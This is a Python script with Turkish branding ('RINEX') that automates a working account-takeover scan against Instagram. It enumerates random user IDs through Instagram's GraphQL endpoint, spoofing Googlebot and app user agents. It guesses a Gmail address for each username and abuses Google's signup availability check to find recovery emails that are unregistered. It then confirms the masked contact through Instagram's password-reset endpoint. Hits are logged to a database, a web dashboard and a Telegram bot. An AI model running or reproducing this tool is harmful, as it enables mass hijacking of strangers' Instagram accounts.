import os, requests, re, sys, time as t, json, uuid, hashlib, random, string, threading, base64, sqlite3
from requests import get, post as pp
from user_agent import generate_user_agent as _ua
from random import choice as _ch, randrange as _rr
import httpx
from flask import Flask, render_template_string, send_file, jsonify, request
from datetime import datetime
import html

app_web = Flask(__name__)

RESET = '\033[0m'
YELLOW = '\033[93m'
RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
C1 = "\033[1;97;40m"

_CHARS = 'azertyuiopmlkjhgfdsqwxcvbn'

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>RINEX Instagram Scanner</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #0a0a0a; 
            color: #00ff00; 
            font-family: 'Courier New', monospace;
            padding: 20px;
            min-height: 100vh;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: #111;
            border: 1px solid #00ff00;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 0 30px rgba(0,255,0,0.1);
        }
        .header {
            text-align: center;
            border-bottom: 1px solid #00ff00;
            padding-bottom: 20px;
            margin-bottom: 20px;
        }
        .header h1 {
            color: #ffd700;
            text-shadow: 0 0 20px rgba(255,215,0,0.3);
            font-size: 2.5em;
        }
        .header p {
            color: #ff6b6b;
            margin-top: 10px;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        .stat-card {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 15px;
            text-align: center;
        }
        .stat-card .number {
            font-size: 2em;
            color: #00ff00;
            font-weight: bold;
        }
        .stat-card .label {
            color: #888;
            font-size: 0.9em;
            margin-top: 5px;
        }
        .hits-container {
            margin: 20px 0;
        }
        .hit-item {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 5px;
            padding: 10px;
            margin: 5px 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: all 0.3s;
        }
        .hit-item:hover {
            border-color: #00ff00;
            background: #1f1f1f;
        }
        .hit-item .username {
            color: #00ff00;
            font-weight: bold;
        }
        .hit-item .year {
            color: #ffd700;
        }
        .hit-item .email {
            color: #4fc3f7;
        }
        .btn {
            background: #00ff00;
            color: #0a0a0a;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            text-decoration: none;
            display: inline-block;
        }
        .btn:hover {
            background: #00cc00;
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(0,255,0,0.3);
        }
        .btn-download {
            background: #ffd700;
            color: #0a0a0a;
            padding: 5px 15px;
            font-size: 0.9em;
        }
        .btn-download:hover {
            background: #ffcc00;
        }
        .live-feed {
            max-height: 400px;
            overflow-y: auto;
            background: #0a0a0a;
            border: 1px solid #333;
            border-radius: 5px;
            padding: 10px;
        }
        .live-feed::-webkit-scrollbar {
            width: 8px;
        }
        .live-feed::-webkit-scrollbar-track {
            background: #1a1a1a;
        }
        .live-feed::-webkit-scrollbar-thumb {
            background: #00ff00;
            border-radius: 4px;
        }
        .controls {
            display: flex;
            gap: 10px;
            margin: 20px 0;
            flex-wrap: wrap;
        }
        .status-badge {
            display: inline-block;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 0.8em;
            margin-left: 10px;
        }
        .status-running {
            background: #00ff00;
            color: #0a0a0a;
        }
        .status-stopped {
            background: #ff0000;
            color: #fff;
        }
        @media (max-width: 768px) {
            .header h1 { font-size: 1.8em; }
            .stats { grid-template-columns: repeat(2, 1fr); }
            .hit-item { flex-direction: column; align-items: flex-start; gap: 5px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚡ RINEX SCANNER ⚡</h1>
            <p>BY RINEX @rinexdestek | @rinexsorgux</p>
            <p>Status: <span class="status-badge status-running">🔴 LIVE</span></p>
        </div>

        <div class="stats">
            <div class="stat-card">
                <div class="number">{{ stats.hits }}</div>
                <div class="label">🎯 Total Hits</div>
            </div>
            <div class="stat-card">
                <div class="number">{{ stats.checked }}</div>
                <div class="label">🔍 Checked</div>
            </div>
            <div class="stat-card">
                <div class="number">{{ stats.bad_email }}</div>
                <div class="label">❌ Bad Email</div>
            </div>
            <div class="stat-card">
                <div class="number">{{ stats.bad_instagram }}</div>
                <div class="label">🚫 Bad Instagram</div>
            </div>
        </div>

        <div class="controls">
            <a href="/download/all" class="btn">📥 Download All Hits</a>
            <a href="/download/txt" class="btn btn-download">📄 Download TXT</a>
            <button onclick="refreshData()" class="btn">🔄 Refresh</button>
        </div>

        <div class="hits-container">
            <h2>🎯 Recent Hits</h2>
            <div class="live-feed" id="hitsFeed">
                {% for hit in recent_hits %}
                <div class="hit-item">
                    <div>
                        <span class="username">@{{ hit.username }}</span>
                        <span class="email">{{ hit.email }}</span>
                    </div>
                    <div>
                        <span class="year">📅 {{ hit.year }}</span>
                        <span>👥 {{ hit.followers }}</span>
                        <span>📝 {{ hit.posts }}</span>
                        <a href="https://instagram.com/{{ hit.username }}" target="_blank" class="btn btn-download" style="margin-left:10px;">🔗</a>
                    </div>
                </div>
                {% endfor %}
            </div>
        </div>
    </div>

    <script>
        function refreshData() {
            fetch('/api/hits')
                .then(response => response.json())
                .then(data => {
                    document.querySelectorAll('.stat-card .number')[0].textContent = data.hits;
                    document.querySelectorAll('.stat-card .number')[1].textContent = data.checked;
                    document.querySelectorAll('.stat-card .number')[2].textContent = data.bad_email;
                    document.querySelectorAll('.stat-card .number')[3].textContent = data.bad_instagram;
                    
                    const feed = document.getElementById('hitsFeed');
                    feed.innerHTML = data.hits_list.map(hit => `
                        <div class="hit-item">
                            <div>
                                <span class="username">@${hit.username}</span>
                                <span class="email">${hit.email}</span>
                            </div>
                            <div>
                                <span class="year">📅 ${hit.year}</span>
                                <span>👥 ${hit.followers}</span>
                                <span>📝 ${hit.posts}</span>
                                <a href="https://instagram.com/${hit.username}" target="_blank" class="btn btn-download" style="margin-left:10px;">🔗</a>
                            </div>
                        </div>
                    `).join('');
                });
        }
        setInterval(refreshData, 10000);
    </script>
</body>
</html>
"""

class _Core:
    def __init__(self):
        self._H = 0
        self._C = 0
        self._BI = 0
        self._BE = 0
        self._yr_range = None
        self._yr_val = None
        self._found = set()
        self._cache = {}
        self._token = os.environ.get('TELEGRAM_TOKEN', '')
        self._cid = os.environ.get('TELEGRAM_CHAT_ID', '')
        self._tls_file = "_dabb_tls.dat"
        self._hits_file = "_dabb_hits.log"
        self._db_file = "hits.db"
        self._init_db()
        self._running = True
    
    def _init_db(self):
        conn = sqlite3.connect(self._db_file)
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS hits
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      username TEXT,
                      email TEXT,
                      year TEXT,
                      followers INTEGER,
                      posts INTEGER,
                      reset_link TEXT,
                      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
        conn.commit()
        conn.close()
    
    def _save_hit_to_db(self, username, email, year, followers, posts, reset_link):
        try:
            conn = sqlite3.connect(self._db_file)
            c = conn.cursor()
            c.execute('''INSERT INTO hits (username, email, year, followers, posts, reset_link)
                         VALUES (?, ?, ?, ?, ?, ?)''',
                      (username, email, year, followers, posts, reset_link))
            conn.commit()
            conn.close()
            return True
        except Exception as e:
            print(f"DB Error: {e}")
            return False
    
    def _get_recent_hits(self, limit=50):
        try:
            conn = sqlite3.connect(self._db_file)
            c = conn.cursor()
            c.execute('''SELECT username, email, year, followers, posts, reset_link 
                         FROM hits ORDER BY timestamp DESC LIMIT ?''', (limit,))
            rows = c.fetchall()
            conn.close()
            return rows
        except:
            return []
    
    def _get_all_hits(self):
        try:
            conn = sqlite3.connect(self._db_file)
            c = conn.cursor()
            c.execute('SELECT username, email, year, followers, posts, reset_link FROM hits')
            rows = c.fetchall()
            conn.close()
            return rows
        except:
            return []
    
    def _clear(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def _banner(self):
        self._clear()
        print(f"""{YELLOW}
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
   █                                      
   █    {YELLOW}★BY RİNEX ★ {RESET}
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
""")
        print(f'''{YELLOW}
        
╔═════════════════════════════════
║{GREEN}BY RİNEX @rinexdestek {YELLOW} 
║{RED}RİNEX 2026 İNSTA TOOL @rinexsorgux {RED}
║  {YELLOW} ★BY RİNEX {GREEN}                       
╚════════════════════════════════
''')
    
    def _fetch_tokens(self):
        try:
            googlebot_ua = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
            a1 = ''.join(_ch(_CHARS) for _ in range(_rr(6,9)))
            a2 = ''.join(_ch(_CHARS) for _ in range(_rr(3,9)))
            b1 = ''.join(_ch(_CHARS) for _ in range(_rr(15,30)))
            he = {
                "accept":"*/*",
                "content-type":"application/x-www-form-urlencoded;charset=UTF-8",
                "google-accounts-xsrf":"1",
                "sec-ch-ua-mobile":"?1",
                "sec-ch-ua-platform":'"Android"',
                'user-agent':googlebot_ua,
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            }
            r1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he, timeout=10)
            c1 = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', r1.text).group(2)
            cks = {'__Host-GAPS':b1}
            hd = {
                'authority':'accounts.google.com',
                'accept':'*/*',
                'content-type':'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf':'1',
                'origin':'https://accounts.google.com',
                'user-agent':googlebot_ua,
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            }
            data = {
                'f.req':'["'+c1+'","'+a1+'","'+a2+'","'+a1+'","'+a2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                'deviceinfo':'[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
            }
            session = requests.Session()
            session.headers.update(hd)
            session.cookies.update(cks)
            resp = session.post('https://accounts.google.com/_/signup/validatepersonaldetails', data=data, timeout=10)
            tl = str(resp.text).split('",null,"')[1].split('"')[0]
            b1 = resp.cookies.get_dict()['__Host-GAPS']
            try:
                os.remove(self._tls_file)
            except:
                pass
            with open(self._tls_file,'a') as f:
                f.write(tl+'//'+b1+'\n')
            return True
        except Exception as e:
            print(f"Token fetch error: {e}")
            return False
    
    def _droid_ua(self):
        devs = [
            ("samsung","SM-G973F","beyond1","exynos9820"),
            ("samsung","SM-A536B","a53x","s5e8825"),
            ("samsung","SM-S918B","dm1q","kalama"),
            ("Google","Pixel 6","raven","gs101"),
            ("Google","Pixel 7","panther","gs201"),
            ("Xiaomi","M2102J20SG","ares","mt6893"),
            ("OnePlus","ONEPLUS A6003","OnePlus6","sdm845"),
            ("OPPO","CPH2371","OP4F1F","mt6893"),
        ]
        d = random.choice(devs)
        v = random.choice(["11","12","13","14"])
        api = {"11":"30","12":"31","13":"33","14":"34"}[v]
        dpi = random.choice(["420","480"])
        h = random.choice(["2280","2340","2400"])
        ig = f"{random.randint(300,350)}.0.0.{random.randint(10,40)}.{random.randint(80,150)}"
        return f"Instagram {ig} Android ({api}/{v}; {dpi}dpi; 1080x{h}; {d[0]}; {d[1]}; {d[2]}; {d[3]}; en_US; {random.randint(300000000,400000000)})"
    
    def _val_ig(self, e):
        try:
            ua = self._droid_ua()
            headers = {
                'User-Agent': ua,
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Cache-Control': 'max-age=0',
                'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
            }
            
            session = httpx.Client(timeout=15, follow_redirects=True)
            session.headers.update(headers)
            session.get('https://www.instagram.com/')
            
            r = session.post(
                "https://i.instagram.com/api/v1/users/check_email/",
                data=f"email={e}",
            )
            
            if 'email_is_taken' in r.text:
                return "good_instagram"
            return "bad_instagram"
        except Exception as e:
            return "error"
    
    def _get_reset(self, u):
        try:
            ua = self._droid_ua()
            ig_did = str(uuid.uuid4()).upper()
            mid = base64.b64encode(uuid.uuid4().bytes).decode()[:32]
            
            h = {
                "User-Agent": ua,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Connection": "keep-alive",
                "x-ig-app-id": "567067343352427",
                "x-ig-device-id": ig_did,
                "x-ig-connection-type": "WIFI",
                "x-ig-capabilities": "3brTvw==",
                "x-csrftoken": "missing",
                "x-fb-http-engine": "Liger",
                "Origin": "https://www.instagram.com",
                "Referer": "https://instagram.com/accounts/password/reset/",
                "Cookie": f"ig_did={ig_did}; mid={mid}; csrftoken=missing",
                "sec-ch-ua": '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            }
            
            session = httpx.Client(timeout=20, follow_redirects=True)
            session.headers.update(h)
            session.get('https://www.instagram.com/')
            
            r = session.post(
                "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
                data={"email_or_username":u},
            ).text
            data = json.loads(r)
            if "contact_point" in data:
                return data["contact_point"]
            return 'N/A'
        except:
            return 'N/A'
    
    def _smart_match(self, u, ri):
        if not ri or ri == 'N/A':
            return True
        try:
            if '@' in ri:
                rp = ri.split('@')[0]
            else:
                rp = ri
            cl = rp.replace('*','').replace('•','').replace('…','').replace('.','')
            if len(cl) < 1 or len(u) < 1:
                return True
            fm = cl[0].lower() == u[0].lower()
            lm = cl[-1].lower() == u[-1].lower() if len(cl) >= 2 else True
            return fm and lm
        except:
            return True
    
    def _yr_from_id(self, uid):
        try:
            x = int(uid)
            if x < 18957417: return 2010
            elif x < 210468786: return 2011
            elif x < 390438486: return 2012
            elif x < 1479010000: return 2013
            elif x < 1700000000: return 2014
            elif x < 3313668786: return 2015
            elif x < 5398785217: return 2016
            elif x < 7497939245: return 2017
            elif x < 11254029834: return 2018
            elif x < 21254029834: return 2019
            elif x < 50289297647: return 2020
            elif x < 57464707082: return 2021
            elif x < 63313426938: return 2022
            elif x < 900000000000: return 2023
            else: return 2024
        except:
            return 'N/A'
    
    def _send_hit(self, u, d, re, ry, f, p):
        self._H += 1
        email = f"{u}@{d}"
        msg = f"""BY RİNEX ⚡
━━━━━━━━━━━━━━━
👤 @{u}
📧 {email}
📅 YÎL TARİH: {ry}
👥 takipçi: {f}
📝 Post: {p}
🔑 HESAP LİNK: {re}
━━━━━━━━━━━━━━━
🔗 instagram.com/{u}
👀rinexdestek """
        
        self._save_hit_to_db(u, email, str(ry), f, p, re)
        
        try:
            with open(self._hits_file,'a',encoding='utf-8') as fh:
                fh.write(f"@{u} | {email} | {ry} | {re}\n")
        except: pass
        
        if self._token and self._cid:
            try:
                requests.post(f"https://api.telegram.org/bot{self._token}/sendMessage",
                              json={'chat_id':self._cid,'text':msg}, timeout=10)
            except: pass
        
        print(f"{GREEN}[HIT]{RESET} @{u} | Year: {ry} | Followers: {f}")
    
    def _val_gml(self, e):
        if '@' in e: e = str(e).split('@')[0]
        for _ in range(3):
            try:
                try:
                    _x = open(self._tls_file,'r').read().splitlines()[0]
                except:
                    self._fetch_tokens()
                    _x = open(self._tls_file,'r').read().splitlines()[0]
                _tl, _h = _x.split('//')
                c = {'__Host-GAPS':_h}
                
                googlebot_ua = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
                h = {
                    'authority': 'accounts.google.com',
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'google-accounts-xsrf': '1',
                    'origin': 'https://accounts.google.com',
                    'user-agent': googlebot_ua,
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                }
                p = {'TL':_tl}
                d = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+_tl+'%22%2C%22'+e+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
                
                session = requests.Session()
                session.headers.update(h)
                session.cookies.update(c)
                r = session.post('https://accounts.google.com/_/signup/usernameavailability', params=p, data=d, timeout=10)
                if '"gf.uar",1' in str(r.text):
                    return 'good'
                elif '"er",null,null,null,null,400' in str(r.text):
                    self._fetch_tokens()
                    continue
                else:
                    return 'bad'
            except:
                self._fetch_tokens()
        return 'bad'
    
    def _hit_process(self, e, ud=None):
        try:
            gml = self._val_gml(e)
            if gml == 'good':
                u, d = e.split('@')
                re = self._get_reset(u)
                if not self._smart_match(u, re):
                    self._BE += 1
                    return
                f = 0
                p = 0
                ry = 'N/A'
                if ud:
                    f = ud.get('follower_count',0)
                    p = ud.get('media_count',0)
                    uid = str(ud.get('id', ud.get('pk','')))
                    ry = self._yr_from_id(uid)
                self._send_hit(u, d, re, ry, f, p)
            else:
                self._BE += 1
        except:
            self._BE += 1
    
    def _process(self, e, ud=None):
        self._C += 1
        try:
            v = self._val_ig(e)
            if v == "good_instagram":
                self._hit_process(e, ud)
            else:
                self._BI += 1
        except:
            self._BI += 1
    
    def _scan_loop(self):
        while self._running:
            try:
                rnd = str(random.randint(150,999))
                ua_list = [
                    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
                    "Instagram 311.0.0.32.118 Android (23/6.0; 420dpi; 1080x2280; SAMSUNG; SM-G973F; beyond1; qcom; en_US; 545986123)"
                ]
                ua = random.choice(ua_list)
                
                if self._yr_range:
                    st, en = self._yr_range
                    Id = str(_rr(st, en))
                else:
                    Id = str(_rr(2500000000, 8597939245))
                
                lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
                
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en,en-US;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'dnt': '1',
                    'origin': 'https://www.instagram.com',
                    'priority': 'u=1, i',
                    'referer': 'https://www.instagram.com/cristiano/following/',
                    'user-agent': ua,
                    'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
                    'x-fb-lsd': lsd,
                    'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Cache-Control': 'no-cache',
                }
                
                d = {
                    'lsd': lsd,
                    'fb_api_caller_class': 'RelayModern',
                    'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                    'variables': '{"userID":"'+Id+'","username":"cristiano"}',
                    'server_timestamps': 'true',
                    'doc_id': '7717269488336001',
                }
                
                session = requests.Session()
                session.headers.update(headers)
                r = session.post('https://www.instagram.com/api/graphql', data=d, timeout=10)
                
                try:
                    j = r.json()
                except:
                    continue
                
                ud = j.get('data',{}).get('user',{})
                if not ud:
                    continue
                
                u = ud.get('username','')
                if not u or u in self._found:
                    continue
                if '_' in u or len(u) < 8:
                    continue
                
                self._found.add(u)
                self._cache[u] = ud
                email = u + '@gmail.com'
                self._process(email, ud)
                
            except Exception as e:
                continue
    
    def _stats_loop(self):
        while self._running:
            self._clear()
            self._banner()
            yr = f"{CYAN}{self._yr_val}" if self._yr_val else "ALL"
            tt = f"""
 ╔════════════════════════════════════╗
 ║  {YELLOW} BY RİNEX LIVE STATS ⚡{C1}    ║
 ╠════════════════════════════════════╣
 ║  🎯 Hit HESAP         : {RED}{self._H}{C1}
 ║  🔍 checklendi     : {YELLOW}{self._C}{C1}
 ║  ❌ BAD HESAP    : {RED}{self._BE}{C1}
 ║  🚫 Bad Instagram  : {YELLOW}{self._BI}{C1}
 ║  📅 YİL TARİH : {yr}{C1}
 ╠════════════════════════════════════╣
 ║  👨‍@rinexdestek | ⛓️ @rinexsorgux   ║
 ╚════════════════════════════════════╝
"""
            print(tt)
            t.sleep(3)
    
    def run(self):
        self._banner()
        print(f"{GREEN}[+] Bot başlatılıyor...{RESET}")
        print(f"{GREEN}[+] Token: {'Var' if self._token else 'Yok'}{RESET}")
        print(f"{GREEN}[+] Chat ID: {'Var' if self._cid else 'Yok'}{RESET}")
        
        self._fetch_tokens()
        
        # Yıl seçimi - default ALL
        self._yr_range = None
        self._yr_val = None
        
        print(f"{GREEN}[+] Tüm yıllar taranıyor...{RESET}")
        t.sleep(1)
        
        # Web sunucusunu başlat
        threading.Thread(target=self._start_web_server, daemon=True).start()
        
        # Scanner thread'leri başlat
        threading.Thread(target=self._stats_loop, daemon=True).start()
        for _ in range(100):
            threading.Thread(target=self._scan_loop, daemon=True).start()
        
        print(f"{GREEN}[+] Web interface: http://0.0.0.0:{os.environ.get('PORT', 5000)}{RESET}")
        
        while True:
            t.sleep(10)
    
    def _start_web_server(self):
        port = int(os.environ.get('PORT', 5000))
        app_web.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# Flask routes
@app_web.route('/')
def index():
    hits = app._get_recent_hits(50)
    stats = {
        'hits': app._H,
        'checked': app._C,
        'bad_email': app._BE,
        'bad_instagram': app._BI
    }
    
    recent_hits = []
    for hit in hits:
        recent_hits.append({
            'username': hit[0],
            'email': hit[1],
            'year': hit[2],
            'followers': hit[3],
            'posts': hit[4],
            'reset_link': hit[5]
        })
    
    return render_template_string(HTML_TEMPLATE, stats=stats, recent_hits=recent_hits)

@app_web.route('/api/hits')
def api_hits():
    hits = app._get_recent_hits(50)
    hits_list = []
    for hit in hits:
        hits_list.append({
            'username': hit[0],
            'email': hit[1],
            'year': hit[2],
            'followers': hit[3],
            'posts': hit[4],
            'reset_link': hit[5]
        })
    
    return jsonify({
        'hits': app._H,
        'checked': app._C,
        'bad_email': app._BE,
        'bad_instagram': app._BI,
        'hits_list': hits_list
    })

@app_web.route('/download/all')
def download_all():
    hits = app._get_all_hits()
    html_content = """
    <!DOCTYPE html>
    <html>
    <head><title>All Hits - RINEX Scanner</title>
    <style>
        body { font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
        table { width: 100%; border-collapse: collapse; }
        th, td { border: 1px solid #333; padding: 10px; text-align: left; }
        th { background: #1a1a1a; color: #ffd700; }
        td { background: #111; }
        tr:hover td { background: #1a1a1a; }
        a { color: #00ff00; }
    </style>
    </head>
    <body>
        <h1>🎯 All Hits - RINEX Scanner</h1>
        <p>Total: {} hits</p>
        <table>
            <tr><th>#</th><th>Username</th><th>Email</th><th>Year</th><th>Followers</th><th>Posts</th><th>Reset Link</th></tr>
    """.format(len(hits))
    
    for i, hit in enumerate(hits, 1):
        html_content += f"""
            <tr>
                <td>{i}</td>
                <td><a href="https://instagram.com/{hit[0]}" target="_blank">@{hit[0]}</a></td>
                <td>{hit[1]}</td>
                <td>{hit[2]}</td>
                <td>{hit[3]}</td>
                <td>{hit[4]}</td>
                <td><a href="{hit[5]}" target="_blank">Link</a></td>
            </tr>
        """
    
    html_content += "</table></body></html>"
    return html_content

@app_web.route('/download/txt')
def download_txt():
    hits = app._get_all_hits()
    content = "RINEX SCANNER - ALL HITS\n"
    content += "=" * 50 + "\n"
    content += f"Total Hits: {len(hits)}\n"
    content += "=" * 50 + "\n\n"
    
    for hit in hits:
        content += f"@{hit[0]} | {hit[1]} | {hit[2]} | Followers: {hit[3]} | Posts: {hit[4]}\n"
    
    filename = f"rinex_hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(content)
    
    return send_file(filename, as_attachment=True)

app = _Core()

if __name__ == '__main__':
    try:
        app.run()
    except KeyboardInterrupt:
        sys.exit()
